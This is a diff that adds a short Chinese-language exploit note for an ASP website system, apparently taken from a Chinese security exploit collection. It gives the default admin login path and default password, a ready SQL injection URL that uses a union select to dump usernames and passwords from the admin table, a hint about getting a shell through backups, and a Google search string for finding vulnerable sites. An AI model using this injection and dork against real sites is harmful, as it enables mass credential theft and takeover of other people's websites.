@@ -1,0 +1,10 @@
+默认后台：http://www.shitsec.com/admin/Login.asp
+默认密码：admin 123456
+
+exp:
+http://www.shitsec.com/show_pt.asp?id=1568 and 1=2 union select 1,password,3,username,5,6,7,8,9,10,11,12,13,14,15 from admin
+
+注：错误会返回主页。如字段不对，自行构造！拿shell有备份。
+
+
+google:inurl:show_pt.asp?id= 【页面收藏】网站地图
